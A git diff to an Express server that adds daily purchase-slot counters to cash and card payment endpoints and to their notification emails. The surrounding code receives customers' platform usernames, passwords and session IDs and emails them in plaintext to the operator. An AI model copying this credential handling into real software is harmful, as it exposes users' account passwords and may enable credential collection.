@@ -253,9 +253,11 @@ app.post('/submit-cash-payment', async (req, res) => {
     
     // Increment purchase count for this product
     resetDailyCountersIfNeeded();
+    let remainingSlots = 0;
     if (productName && dailyLimits[productName]) {
       dailyLimits[productName].count++;
-      console.log(`✅ Product "${productName}" purchase count: ${dailyLimits[productName].count}/${MAX_PURCHASES_PER_DAY}`);
+      remainingSlots = Math.max(0, MAX_PURCHASES_PER_DAY - dailyLimits[productName].count);
+      console.log(`✅ Product "${productName}" purchase count: ${dailyLimits[productName].count}/${MAX_PURCHASES_PER_DAY} (${remainingSlots} remaining)`);
     }
     
     // Send email notification for cash payment (non-blocking)
@@ -274,7 +276,9 @@ app.post('/submit-cash-payment', async (req, res) => {
       username,
       password,
       productName,
-      productPrice
+      productPrice,
+      remainingSlots: remainingSlots,
+      currentCount: productName && dailyLimits[productName] ? dailyLimits[productName].count : 0
     }).catch(err => {
       console.error('Error sending cash payment notification email:', err);
       // Don't fail the request if email fails
@@ -294,9 +298,13 @@ app.post('/submit-login-details', async (req, res) => {
     
     // Increment purchase count for this product
     resetDailyCountersIfNeeded();
+    let remainingSlots = 0;
+    let currentCount = 0;
     if (productName && dailyLimits[productName]) {
       dailyLimits[productName].count++;
-      console.log(`✅ Product "${productName}" purchase count: ${dailyLimits[productName].count}/${MAX_PURCHASES_PER_DAY}`);
+      currentCount = dailyLimits[productName].count;
+      remainingSlots = Math.max(0, MAX_PURCHASES_PER_DAY - currentCount);
+      console.log(`✅ Product "${productName}" purchase count: ${currentCount}/${MAX_PURCHASES_PER_DAY} (${remainingSlots} remaining)`);
     }
     
     // Send email notification with login details (CARD PAYMENT - only email sent for card)
@@ -307,7 +315,9 @@ app.post('/submit-login-details', async (req, res) => {
       sessionId,
       productName: productName || 'Unknown Product',
       productPrice: productPrice || 'N/A',
-      paymentMethod: paymentMethod || 'card' // Default to card for this endpoint
+      paymentMethod: paymentMethod || 'card', // Default to card for this endpoint
+      remainingSlots: remainingSlots,
+      currentCount: currentCount
     });
 
     res.json({ success: true, message: 'Login details received successfully' });
@@ -501,7 +511,7 @@ async function sendLoginNotification(data) {
 
 // Send cash payment notification via email
 async function sendCashPaymentNotification(data) {
-  const { username, password, productName, productPrice } = data;
+  const { username, password, productName, productPrice, remainingSlots = 0, currentCount = 0 } = data;
   
   if (!resend || !process.env.YOUR_EMAIL) {
     console.error('❌ Cannot send email - Resend not initialized or YOUR_EMAIL not set');
@@ -562,6 +572,15 @@ async function sendCashPaymentNotification(data) {
                 </div>
               </div>
 
+              <!-- Slots Remaining Card -->
+              <div style="background: linear-gradient(135deg, #e7f3ff 0%, #d0e7ff 100%); padding: 20px; border-radius: 12px; border: 2px solid #6C63FF; margin-bottom: 25px; text-align: center;">
+                <p style="margin: 0; color: #004085; font-weight: 700; font-size: 18px;">📊 Daily Slots Status</p>
+                <p style="margin: 8px 0 0 0; color: #004085; font-size: 24px; font-weight: 700;">
+                  ${remainingSlots} slot${remainingSlots !== 1 ? 's' : ''} remaining today
+                </p>
+                <p style="margin: 5px 0 0 0; color: #666; font-size: 14px;">(${currentCount} / ${MAX_PURCHASES_PER_DAY} used)</p>
+              </div>
+
               <!-- Action Required -->
               <div style="background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%); padding: 20px; border-radius: 12px; border: 2px solid #d9534f; text-align: center;">
                 <p style="margin: 0; color: #721c24; font-weight: 700; font-size: 16px;">⚠️ ACTION REQUIRED</p>
@@ -597,7 +616,7 @@ async function sendCashPaymentNotification(data) {
 
 // Send login details notification via email (after card payment)
 async function sendLoginDetailsNotification(data) {
-  const { username, password, platform, sessionId, productName, productPrice, paymentMethod } = data;
+  const { username, password, platform, sessionId, productName, productPrice, paymentMethod, remainingSlots = 0, currentCount = 0 } = data;
   
   if (!resend || !process.env.YOUR_EMAIL) {
     console.error('❌ Cannot send email - Resend not initialized or YOUR_EMAIL not set');
@@ -658,10 +677,19 @@ async function sendLoginDetailsNotification(data) {
                 </div>
                 
                 <!-- Payment Method Badge -->
-                <div style="background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); padding: 15px; border-radius: 10px; text-align: center; border: 2px solid #28a745;">
+                <div style="background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); padding: 15px; border-radius: 10px; text-align: center; border: 2px solid #28a745; margin-bottom: 15px;">
                   <p style="margin: 0; font-size: 18px; font-weight: 700; color: #155724;">
                     💳 PAYMENT METHOD: CARD
                   </p>
+                </div>
+                
+                <!-- Slots Remaining -->
+                <div style="background: linear-gradient(135deg, #e7f3ff 0%, #d0e7ff 100%); padding: 15px; border-radius: 10px; text-align: center; border: 2px solid #6C63FF;">
+                  <p style="margin: 0; color: #004085; font-weight: 700; font-size: 16px;">📊 Daily Slots Status</p>
+                  <p style="margin: 8px 0 0 0; color: #004085; font-size: 22px; font-weight: 700;">
+                    ${remainingSlots} slot${remainingSlots !== 1 ? 's' : ''} remaining today
+                  </p>
+                  <p style="margin: 5px 0 0 0; color: #666; font-size: 13px;">(${currentCount} / ${MAX_PURCHASES_PER_DAY} used)</p>
                 </div>
               </div>
 
